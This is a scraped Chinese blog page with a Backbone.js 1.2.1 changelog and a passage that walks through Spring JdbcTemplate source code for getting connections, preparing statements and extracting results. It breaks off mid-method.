<p><a href="http://www.oschina.net/question/1765084_236572" target="_blank" rel="external">6&#x6708;14&#x65E5;&#x4E0A;&#x6D77; OSC &#x6E90;&#x521B;&#x4F1A;&#x5F00;&#x59CB;&#x62A5;&#x540D;&#xFF0C;&#x9001;&#x673A;&#x68B0;&#x952E;&#x76D8;&#x548C;&#x5F00;&#x6E90;&#x65E0;&#x7801;&#x5185;&#x88E4;</a></p>
<p>Backbone.js 1.2.1 &#x53D1;&#x5E03;&#xFF0C;&#x6B64;&#x7248;&#x672C;&#x66F4;&#x65B0;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A; </p>
<ul>
<li>Collection#add now avoids trying to parse a model instance when passing parse: true .</li>
<li>Bug fix in Collection#remove .</li>
<li>Model#fetch no longer parses the response when passing patch: false .</li>
<li>Bug fix for iframe-based History when used with JSDOM.</li>
<li>Bug fix where Collection#invoke was not taking additional arguments.</li>
<li>When using on with an event map, you can now pass the context as the second argument. &#xA0;This was previously an undocumented behavior from 1.1.2 removed in 1.2.0.</li>
</ul>
<p>&#x6B64;&#x7248;&#x672C;&#x73B0;&#x5DF2;&#x63D0;&#x4F9B;&#x4E0B;&#x8F7D;&#xFF1A; <a href="https://github.com/jashkenas/backbone/archive/1.2.1.zip" target="_blank" rel="external">https://github.com/jashkenas/backbone/archive/1.2.1.zip</a> &#x3002; </p>
<p>Backbone.js &#x662F;&#x4E00;&#x79CD;&#x91CD;&#x91CF;&#x7EA7;javascript&#xA0; MVC &#x5E94;&#x7528;&#x6846;&#x67B6;,&#x901A;&#x8FC7;Models&#x8FDB;&#x884C;key-value&#x7ED1;&#x5B9A;&#x53CA;custom&#x4E8B;&#x4EF6;&#x5904;&#x7406;,&#x901A;&#x8FC7;Collections&#x63D0;&#x4F9B;&#x4E00;&#x5957;&#x4E30;&#x5BCC;&#x7684;API&#x7528;&#x4E8E;&#x679A;&#x4E3E;&#x529F;&#x80FD;,&#x901A;&#x8FC7; Views&#x6765;&#x8FDB;&#x884C;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x53CA;&#x4E0E;&#x73B0;&#x6709;&#x7684;Application&#x901A;&#x8FC7;RESTful JSON&#x63A5;&#x53E3;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;.</p>
<p>&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x4E8E;&#x73B0;&#x5728;&#x7684;&#x7C7B;Twitter web2.0&#x7F51;&#x7AD9;&#x7684;&#x5F00;&#x53D1;!</p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/bui6Rrq">&#x5E38;&#x7528;&#x8DE8;&#x57DF;&#x65B9;&#x6CD5;&#x5B9E;&#x8DF5;&#xFF08;&#x4E00;&#xFF09;</a></li>
<li>2.<a href="/articles/Mzqyaay">&#x524D;&#x7AEF;&#x5F00;&#x53D1;&#x9762;&#x8BD5;&#x5C0F;&#x7ED3;</a></li>
<li>3.<a href="/articles/MjYZvm3">chrome&#x6269;&#x5C55;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#x6559;&#x7A0B;&#x4E4B;&#x5F00;&#x53D1;chrome&#x5E94;&#x7528;&#x57FA;&#x7840;</a></li>
<li>4.<a href="/articles/FvUfAzE">[Network] HTML&#x3001;XML&#x548C;JSON&#x5B66;&#x4E60;&#x6C47;&#x603B;</a></li>
<li>5.<a href="/articles/I7FrQ3j">ValidationSuar&#x8868;&#x5355;&#x9A8C;&#x8BC1;&#x6846;&#x67B6;-&#x652F;&#x6301;ASP.NET MVC ASP.NET WebFroM</a></li>
<li><p>6.<a href="/articles/NjA3Yzn">JavaScript OOP &#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;7&#x79CD;&#x65B9;&#x5F0F;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/BbaINzQ">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;BbaINzQ&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Backbone-js/">Backbone.js</a><a href="/tags/MVC模式/">MVC模式</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/6681e21/" title=".spring jdbctemplate源码跟踪 -" itemprop="url">.spring jdbctemplate源码跟踪 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="-spring_jdbctemplate&#x6E90;&#x7801;&#x8DDF;&#x8E2A;">.spring jdbctemplate&#x6E90;&#x7801;&#x8DDF;&#x8E2A;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 15:46:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/davidwang456/p/4542409.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/davidwang456/p/4542409.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11070001">Spring</a><a href="/topics/11070010">JDBC</a></p>
<p>&#x95F2;&#x7740;&#x6CA1;&#x4E8B;&#xFF0C;&#x770B;&#x770B;&#x6E90;&#x7801;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x4E50;&#x8DA3;!</p>
<p>java&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x57FA;&#x672C;&#x6B65;&#x9AA4;&#x90FD;&#x662F;&#x7C7B;&#x4F3C;&#x7684;&#xFF1A;</p>
<ol>
<li><p>&#x5EFA;&#x7ACB;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#xFFFD;&#xFFFD;&#xFFFD;</p>
</li>
<li><p>&#x521B;&#x5EFA;Connection</p>
</li>
<li><p>&#x521B;&#x5EFA;statement&#x6216;&#x8005;preparedStateement</p>
</li>
<li><p>&#x6267;&#x884C;sql&#xFF0C;&#x8FD4;&#x56DE;ResultSet</p>
</li>
<li><p>&#x5173;&#x95ED;resultSet</p>
</li>
</ol>
<p>5.&#x5173;&#x95ED;statement</p>
<p>6.&#x5173;&#x95ED;Connection</p>
<p>Spring&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x5728;jdbc&#x4E0A;&#x9762;&#x505A;&#x4E86;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x4F7F;&#x7528;spring&#x7684;&#x6CE8;&#x5165;&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;DataSource&#x6CE8;&#x518C;&#x5230;JdbcTemplate&#x4E4B;&#x4E2D;&#x3002;</p>
<ol>
<li><p>&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x4E09;&#x79CD;&#x5F62;&#x5F0F;</p>
<p> /**</p>
<ul>
<li>Construct a new JdbcTemplate for bean usage.</li>
<li>&lt;p&gt;Note: The DataSource has to be set before using the instance.</li>
<li><p>@see #setDataSource<br>*/<br>public JdbcTemplate() {<br>}</p>
<p>/**</p>
</li>
<li>Construct a new JdbcTemplate, given a DataSource to obtain connections from.</li>
<li>&lt;p&gt;Note: This will not trigger initialization of the exception translator.</li>
<li><p>@param dataSource the JDBC DataSource to obtain connections from<br>*/<br>public JdbcTemplate(DataSource dataSource) {<br> setDataSource(dataSource);<br> afterPropertiesSet();<br>}</p>
<p>/**</p>
</li>
<li>Construct a new JdbcTemplate, given a DataSource to obtain connections from.</li>
<li>&lt;p&gt;Note: Depending on the &quot;lazyInit&quot; flag, initialization of the exception translator</li>
<li>will be triggered.</li>
<li>@param dataSource the JDBC DataSource to obtain connections from</li>
<li>@param lazyInit whether to lazily initialize the SQLExceptionTranslator<br>*/<br>public JdbcTemplate(DataSource dataSource, boolean lazyInit) {<br> setDataSource(dataSource);<br> setLazyInit(lazyInit);<br> afterPropertiesSet();<br>}</li>
</ul>
</li>
</ol>
<p>&#x4E00;&#x79CD;&#x601D;&#x8DEF;&#xFF1A;&#x5C06;datasource&#x6CE8;&#x5165;&#x5230;JdbcTemplate&#x3002;</p>
<p>2.&#x83B7;&#x53D6;Connection</p>
<pre><code>//-------------------------------------------------------------------------
    // <span class="type">Methods</span> dealing <span class="keyword">with</span> <span class="keyword">static</span> <span class="type">SQL</span> (java.sql.<span class="type">Statement</span>)
    //-------------------------------------------------------------------------

    @<span class="type">Override</span>
    public &amp;lt;T&amp;gt; T execute(<span class="type">StatementCallback</span>&amp;lt;T&amp;gt; action) throws <span class="type">DataAccessException</span> {
        <span class="type">Assert</span>.notNull(action, &amp;quot;<span class="type">Callback</span> <span class="keyword">object</span> must <span class="keyword">not</span> be null&amp;quot;);
        <span class="type">Connection</span> con = <span class="type">DataSourceUtils</span>.getConnection(getDataSource());
        <span class="type">Statement</span> <span class="type">stmt</span> = null;
        <span class="keyword">try</span> {
            <span class="type">Connection</span> conToUse = con;
            <span class="keyword">if</span> (this.nativeJdbcExtractor != null &amp;amp;&amp;amp;
                    this.nativeJdbcExtractor.isNativeConnectionNecessaryForNativeStatements()) {
                conToUse = this.nativeJdbcExtractor.getNativeConnection(con);
            }
            <span class="type">stmt</span> = conToUse.createStatement();
            applyStatementSettings(<span class="type">stmt</span>);
            <span class="type">Statement</span> stmtToUse = <span class="type">stmt</span>;
            <span class="keyword">if</span> (this.nativeJdbcExtractor != null) {
                stmtToUse = this.nativeJdbcExtractor.getNativeStatement(<span class="type">stmt</span>);
            }
            T <span class="literal">result</span> = action.doInStatement(stmtToUse);
            handleWarnings(<span class="type">stmt</span>);
            <span class="keyword">return</span> <span class="literal">result</span>;
        }
        catch (<span class="type">SQLException</span> ex) {
            // <span class="type">Release</span> <span class="type">Connection</span> early, to avoid potential connection pool deadlock
            // <span class="keyword">in</span> the <span class="keyword">case</span> <span class="keyword">when</span> the exception translator hasn&amp;apos;t been initialized yet.
            <span class="type">JdbcUtils</span>.closeStatement(<span class="type">stmt</span>);
            <span class="type">stmt</span> = null;
            <span class="type">DataSourceUtils</span>.releaseConnection(con, getDataSource());
            con = null;
            throw getExceptionTranslator().translate(&amp;quot;<span class="type">StatementCallback</span>&amp;quot;, getSql(action), ex);
        }
        <span class="keyword">finally</span> {
            <span class="type">JdbcUtils</span>.closeStatement(<span class="type">stmt</span>);
            <span class="type">DataSourceUtils</span>.releaseConnection(con, getDataSource());
        }
    }
</code></pre><p>Connection&#x7684;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#xFF1A;</p>
<p>2.1. &#x82E5;&#x662F;datasource&#x76F4;&#x63A5;&#x4F7F;&#x7528;jdbc&#x800C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x8BF8;&#x5982;c3p0&#xFF0C;dbcp&#x7B49;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x65F6;&#x5219;&#x4ECE;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#xFF1A;</p>
<pre><code>Connection con = DataSourceUtils.getConnection<span class="params">(getDataSource<span class="params">()</span>)</span>;

<span class="comment">/**
     * Actually obtain a JDBC Connection from the given DataSource.
     * Same as {@link #getConnection}, but throwing the original SQLException.
     * &amp;lt;p&amp;gt;Is aware of a corresponding Connection bound to the current thread, for example
     * when using {@link DataSourceTransactionManager}. Will bind a Connection to the thread
     * if transaction synchronization is active (e.g. if in a JTA transaction).
     * &amp;lt;p&amp;gt;Directly accessed by {@link TransactionAwareDataSourceProxy}.
     * @param dataSource the DataSource to obtain Connections from
     * @return a JDBC Connection from the given DataSource
     * @throws SQLException if thrown by JDBC methods
     * @see #doReleaseConnection
     */</span>
    public static Connection doGetConnection<span class="params">(DataSource dataSource)</span> throws SQLException {
        Assert.notNull<span class="params">(dataSource, &amp;quot;No DataSource specified&amp;quot;)</span>;
        ConnectionHolder conHolder = <span class="params">(ConnectionHolder)</span> TransactionSynchronizationManager.getResource<span class="params">(dataSource)</span>;
        <span class="keyword">if</span> <span class="params">(conHolder != null &amp;amp;&amp;amp; <span class="params">(conHolder.hasConnection<span class="params">()</span> || conHolder.isSynchronizedWithTransaction<span class="params">()</span>)</span>)</span> {
            conHolder.requested<span class="params">()</span>;
            <span class="keyword">if</span> <span class="params">(!conHolder.hasConnection<span class="params">()</span>)</span> {
                logger.debug<span class="params">(&amp;quot;Fetching resumed JDBC Connection from DataSource&amp;quot;)</span>;
                conHolder.setConnection<span class="params">(dataSource.getConnection<span class="params">()</span>)</span>;
            }
            return conHolder.getConnection<span class="params">()</span>;
        }
        <span class="comment">// Else we either got no holder or an empty thread-bound holder here.</span>

        logger.debug<span class="params">(&amp;quot;Fetching JDBC Connection from DataSource&amp;quot;)</span>;
        Connection con = dataSource.getConnection<span class="params">()</span>;
        <span class="keyword">if</span> <span class="params">(TransactionSynchronizationManager.isSynchronizationActive<span class="params">()</span>)</span> {
            logger.debug<span class="params">(&amp;quot;Registering transaction synchronization for JDBC Connection&amp;quot;)</span>;
            <span class="comment">// Use same Connection for further JDBC actions within the transaction.</span>
            <span class="comment">// Thread-bound object will get removed by synchronization at transaction completion.</span>
            ConnectionHolder holderToUse = conHolder;
            <span class="keyword">if</span> <span class="params">(holderToUse == null)</span> {
                holderToUse = new ConnectionHolder<span class="params">(con)</span>;
            }
            <span class="keyword">else</span> {
                holderToUse.setConnection<span class="params">(con)</span>;
            }
            holderToUse.requested<span class="params">()</span>;
            TransactionSynchronizationManager.registerSynchronization<span class="params">(
                    new ConnectionSynchronization<span class="params">(holderToUse, dataSource)</span>)</span>;
            holderToUse.setSynchronizedWithTransaction<span class="params">(<span class="literal">true</span>)</span>;
            <span class="keyword">if</span> <span class="params">(holderToUse != conHolder)</span> {
                TransactionSynchronizationManager.bindResource<span class="params">(dataSource, holderToUse)</span>;
            }
        }
        return con;
    }
</code></pre><p>ConnectionHolder&#x95F4;&#x63A5;&#x7EE7;&#x627F;&#x4E86;ResourceHolder&#x63A5;&#x53E3;&#xFF0C;ResourceHolder&#x63A5;&#x53E3;&#x5141;&#x8BB8;spring&#x7684;&#x4E8B;&#x52A1;&#x57FA;&#x7840;&#x53EF;&#x4EE5;&#x5728;&#x5FC5;&#x8981;&#x65F6;&#x68C0;&#x7D22;&#x548C;&#x91CD;&#x7F6E;&#x3002;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x7EE7;&#x627F;ResourceHolderSupport&#x5373;&#x53EF;&#x3002;</p>
<p>2.2. &#x82E5;&#x4F7F;&#x7528;&#x4E86;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x65F6;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4ECE;&#x63D2;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;Connection&#x3002;</p>
<pre><code>conToUse = <span class="keyword">this</span>.nativeJdbcExtractor.getNativeConnection(con);
</code></pre><p>&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x7684;&#x5173;&#x7CFB;&#x5982;&#x4E0B;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/2myyAn.jpg" alt=""></p>
<p>&#x5176;&#x5177;&#x4F53;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code><span class="comment">/**
     * Check for a ConnectionProxy chain, then delegate to doGetNativeConnection.
     * &amp;lt;p&amp;gt;ConnectionProxy is used by Spring&amp;apos;s TransactionAwareDataSourceProxy
     * and LazyConnectionDataSourceProxy. The target connection behind it is
     * typically one from a local connection pool, to be unwrapped by the
     * doGetNativeConnection implementation of a concrete subclass.
     * <span class="doctag">@see</span> #doGetNativeConnection
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.ConnectionProxy
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.DataSourceUtils#getTargetConnection
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.TransactionAwareDataSourceProxy
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.LazyConnectionDataSourceProxy
     */</span>
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="function">Connection <span class="title">getNativeConnection</span><span class="params">(Connection con)</span> <span class="keyword">throws</span> SQLException </span>{
        <span class="keyword">if</span> (con == <span class="keyword">null</span>) {
            <span class="keyword">return</span> <span class="keyword">null</span>;
        }
        Connection targetCon = DataSourceUtils.getTargetConnection(con);
        Connection nativeCon = doGetNativeConnection(targetCon);
        <span class="keyword">if</span> (nativeCon == targetCon) {
            <span class="comment">// We haven&amp;apos;t received a different Connection, so we&amp;apos;ll assume that there&amp;apos;s</span>
            <span class="comment">// some additional proxying going on. Let&amp;apos;s check whether we get something</span>
            <span class="comment">// different back from the DatabaseMetaData.getConnection() call.</span>
            DatabaseMetaData metaData = targetCon.getMetaData();
            <span class="comment">// The following check is only really there for mock Connections</span>
            <span class="comment">// which might not carry a DatabaseMetaData instance.</span>
            <span class="keyword">if</span> (metaData != <span class="keyword">null</span>) {
                Connection metaCon = metaData.getConnection();
                <span class="keyword">if</span> (metaCon != <span class="keyword">null</span> &amp;amp;&amp;amp; metaCon != targetCon) {
                    <span class="comment">// We&amp;apos;ve received a different Connection there:</span>
                    <span class="comment">// Let&amp;apos;s retry the native extraction process with it.</span>
                    nativeCon = doGetNativeConnection(metaCon);
                }
            }
        }
        <span class="keyword">return</span> nativeCon;
    }
</code></pre><p>&#x5177;&#x4F53;&#x7684;&#x5B9E;&#x73B0;&#x5728;&#x5176;&#x5B50;&#x7C7B;&#x91CC;&#x9762;&#xFF0C;&#x4EE5;c3p0&#x4E3A;&#x4F8B;&#xFF1A;</p>
<pre><code><span class="comment">/**
 * Retrieve the Connection via C3P0&amp;apos;s {<span class="doctag">@code</span> rawConnectionOperation} API,
 * using the {<span class="doctag">@code</span> getRawConnection} as callback to get access to the
 * raw Connection (which is otherwise not directly supported by C3P0).
 * <span class="doctag">@see</span> #getRawConnection
 */</span>
<span class="annotation">@Override</span>
<span class="keyword">protected</span> <span class="function">Connection <span class="title">doGetNativeConnection</span><span class="params">(Connection con)</span> <span class="keyword">throws</span> SQLException </span>{
    <span class="keyword">if</span> (con <span class="keyword">instanceof</span> C3P0ProxyConnection) {
        C3P0ProxyConnection cpCon = (C3P0ProxyConnection) con;
        <span class="keyword">try</span> {
            <span class="keyword">return</span> (Connection) cpCon.rawConnectionOperation(
                    <span class="keyword">this</span>.getRawConnectionMethod, <span class="keyword">null</span>, <span class="keyword">new</span> Object[] {C3P0ProxyConnection.RAW_CONNECTION});
        }
        <span class="keyword">catch</span> (SQLException ex) {
            <span class="keyword">throw</span> ex;
        }
        <span class="keyword">catch</span> (Exception ex) {
            ReflectionUtils.handleReflectionException(ex);
        }
    }
    <span class="keyword">return</span> con;
}
</code></pre><p>&#x8C03;&#x7528;C3P0 API&#x83B7;&#x53D6;Connection&#x3002;</p>
<ol>
<li><p>&#x521B;&#x5EFA;Statement</p>
<p> stmt = conToUse.createStatement();</p>
<pre><code><span class="label">applyStatementSettings</span>(<span class="keyword">stmt);
</span><span class="label">Statement</span> <span class="keyword">stmtToUse </span>= <span class="keyword">stmt;
</span><span class="label">if</span> (this.nativeJdbcExtractor != null) {
    <span class="keyword">stmtToUse </span>= this.nativeJdbcExtractor.getNativeStatement(<span class="keyword">stmt);
</span>}  
</code></pre><p>3.1 &#x4E0D;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<p> /**</p>
<ul>
<li>Prepare the given JDBC Statement (or PreparedStatement or CallableStatement),</li>
<li>applying statement settings such as fetch size, max rows, and query timeout.</li>
<li>@param stmt the JDBC Statement to prepare</li>
<li>@throws SQLException if thrown by JDBC API</li>
<li>@see #setFetchSize</li>
<li>@see #setMaxRows</li>
<li>@see #setQueryTimeout</li>
<li>@see org.springframework.jdbc.datasource.DataSourceUtils#applyTransactionTimeout<br>*/<br>protected void applyStatementSettings(Statement stmt) throws SQLException {<br> int fetchSize = getFetchSize();<br> if (fetchSize &gt; 0) {<pre><code><span class="tag">stmt</span><span class="class">.setFetchSize</span>(<span class="tag">fetchSize</span>);
</code></pre> }<br> int maxRows = getMaxRows();<br> if (maxRows &gt; 0) {<pre><code>stmt.<span class="built_in">set</span>MaxRows(<span class="keyword">max</span>Rows);
</code></pre> }<br> DataSourceUtils.applyTimeout(stmt, getDataSource(), getQueryTimeout());<br>}</li>
</ul>
</li>
</ol>
<p>&#x8BBE;&#x7F6E;fetch size, max rows, and query timeout.&#x5176;&#x4E2D;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x5728;datasourceUtils&#x4E2D;&#x5B9E;&#x73B0;&#x3002;</p>
<pre><code><span class="comment">/**
    * Apply the specified timeout - overridden by the current transaction timeout,
    * if any - to the given JDBC Statement object.
    * <span class="doctag">@param</span> stmt the JDBC Statement object
    * <span class="doctag">@param</span> dataSource the DataSource that the Connection was obtained from
    * <span class="doctag">@param</span> timeout the timeout to apply (or 0 for no timeout outside of a transaction)
    * <span class="doctag">@throws</span> SQLException if thrown by JDBC methods
    * <span class="doctag">@see</span> java.sql.Statement#setQueryTimeout
    */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">applyTimeout</span><span class="params">(Statement stmt, DataSource dataSource, <span class="keyword">int</span> timeout)</span> <span class="keyword">throws</span> SQLException </span>{
       Assert.notNull(stmt, &amp;quot;No Statement specified&amp;quot;);
       Assert.notNull(dataSource, &amp;quot;No DataSource specified&amp;quot;);
       ConnectionHolder holder = (ConnectionHolder) TransactionSynchronizationManager.getResource(dataSource);
       <span class="keyword">if</span> (holder != <span class="keyword">null</span> &amp;amp;&amp;amp; holder.hasTimeout()) {
          <span class="comment">// Remaining transaction timeout overrides specified value.</span>
          stmt.setQueryTimeout(holder.getTimeToLiveInSeconds());
       }
       <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">(timeout &amp;gt; <span class="number">0</span>)</span> </span>{
          <span class="comment">// No current transaction timeout -&amp;gt; apply specified value.</span>
          stmt.setQueryTimeout(timeout);
       }
    }
</code></pre><p>3.2 &#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<p>&#x4EE5;c3p0&#x4E3A;&#x4F8B;</p>
<pre><code><span class="comment">/**
 * Extracts the innermost delegate from the given Commons DBCP object.
 * Falls back to the given object if no underlying object found.
 * @param obj the Commons DBCP Connection/Statement/ResultSet
 * @return the underlying native Connection/Statement/ResultSet
 */</span>
<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getInnermostDelegate</span>(<span class="params">Object obj</span>) throws SQLException </span>{
    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) {
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="keyword">try</span> {
        Class&amp;lt;?&amp;gt; classToAnalyze = obj.getClass();
        <span class="keyword">while</span> (!Modifier.isPublic(classToAnalyze.getModifiers())) {
            classToAnalyze = classToAnalyze.getSuperclass();
            <span class="keyword">if</span> (classToAnalyze == <span class="keyword">null</span>) {
                <span class="comment">// No public provider class found -&amp;gt; fall back to given object.</span>
                <span class="keyword">return</span> obj;
            }
        }
        Method getInnermostDelegate = classToAnalyze.getMethod(GET_INNERMOST_DELEGATE_METHOD_NAME, (Class[]) <span class="keyword">null</span>);
        Object <span class="keyword">delegate</span> = ReflectionUtils.invokeJdbcMethod(getInnermostDelegate, obj);
        <span class="keyword">return</span> (<span class="keyword">delegate</span> != <span class="keyword">null</span> ? <span class="keyword">delegate</span> : obj);
    }
    <span class="keyword">catch</span> (NoSuchMethodException ex) {
        <span class="keyword">return</span> obj;
    }
    <span class="keyword">catch</span> (SecurityException ex) {
        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(&amp;quot;Commons DBCP getInnermostDelegate method <span class="keyword">is</span> not accessible: &amp;quot; + ex);
    }
}
</code></pre><ol>
<li><p>&#x6267;&#x884C;statement&#x5E76;&#x5173;&#x95ED;&#x4E4B;</p>
<p> T result = action.doInStatement(stmtToUse);</p>
<p> class QueryStatementCallback implements StatementCallback&lt;T&gt;, SqlProvider {</p>
<pre><code><span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="function">T <span class="title">doInStatement</span><span class="params">(Statement stmt)</span> <span class="keyword">throws</span> SQLException </span>{
    ResultSet rs = <span class="keyword">null</span>;
    <span class="keyword">try</span> {
        rs = stmt.executeQuery(sql);
        ResultSet rsToUse = rs;
        <span class="keyword">if</span> (nativeJdbcExtractor != <span class="keyword">null</span>) {
            rsToUse = nativeJdbcExtractor.getNativeResultSet(rs);
        }
        <span class="function"><span class="keyword">return</span> rse.<span class="title">extractData</span><span class="params">(rsToUse)</span></span>;
    }
    <span class="keyword">finally</span> {
        JdbcUtils.closeResultSet(rs);
    }
}
<span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="function">String <span class="title">getSql</span><span class="params">()</span> </span>{
    <span class="keyword">return</span> sql;
}
</code></pre><p> }</p>
</li>
</ol>
<p>4.1 &#x4E0D;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<pre><code>rs = stmt.executeQuery(sql)<span class="comment">;</span>
</code></pre><p>4.2 &#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<pre><code><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> GET_INNERMOST_DELEGATE_METHOD_NAME = &amp;quot;getInnermostDelegate&amp;quot;;
<span class="comment">/**
 * Extracts the innermost delegate from the given Commons DBCP object.
 * Falls back to the given object if no underlying object found.
 * @param obj the Commons DBCP Connection/Statement/ResultSet
 * @return the underlying native Connection/Statement/ResultSet
 */</span>
<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">Object</span> getInnermostDelegate(<span class="keyword">Object</span> obj) <span class="keyword">throws</span> SQLException {
    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) {
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="keyword">try</span> {
        Class&amp;lt;?&amp;gt; classToAnalyze = obj.getClass();
        <span class="keyword">while</span> (!Modifier.isPublic(classToAnalyze.getModifiers())) {
            classToAnalyze = classToAnalyze.getSuperclass();
            <span class="keyword">if</span> (classToAnalyze == <span class="keyword">null</span>) {
                <span class="comment">// No public provider class found -&amp;gt; fall back to given object.</span>
                <span class="keyword">return</span> obj;
            }
        }
        Method getInnermostDelegate = classToAnalyze.getMethod(GET_INNERMOST_DELEGATE_METHOD_NAME, (Class[]) <span class="keyword">null</span>);
        <span class="keyword">Object</span> delegate = ReflectionUtils.invokeJdbcMethod(getInnermostDelegate, obj);
        <span class="keyword">return</span> (delegate != <span class="keyword">null</span> ? delegate : obj);
    }
    <span class="keyword">catch</span> (NoSuchMethodException ex) {
        <span class="keyword">return</span> obj;
    }
    <span class="keyword">catch</span> (SecurityException ex) {
        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(&amp;quot;Commons DBCP getInnermostDelegate method is not accessible: &amp;quot; + ex);
    }
}
</code></pre><p>4.3 &#x63D0;&#x53D6;&#x6570;&#x636E;</p>
<pre><code>    @Override
<span class="keyword">public</span> <span class="built_in">List</span><span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>; extractData(<span class="keyword">ResultSet</span> rs) throws SQLException {
    <span class="built_in">List</span><span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>; results <span class="subst">=</span> (this<span class="built_in">.</span>rowsExpected <span class="subst">&amp;</span><span class="literal">gt</span>; <span class="number">0</span> <span class="subst">?</span> <span class="literal">new</span> ArrayList<span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>;(this<span class="built_in">.</span>rowsExpected) : <span class="literal">new</span> ArrayList<span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>;());
    int rowNum <span class="subst">=</span> <span class="number">0</span>;
    <span class="keyword">while</span> (rs<span class="built_in">.</span>next()) {
        results<span class="built_in">.</span>add(this<span class="built_in">.</span>rowMapper<span class="built_in">.</span>mapRow(rs, rowNum<span class="subst">++</span>));
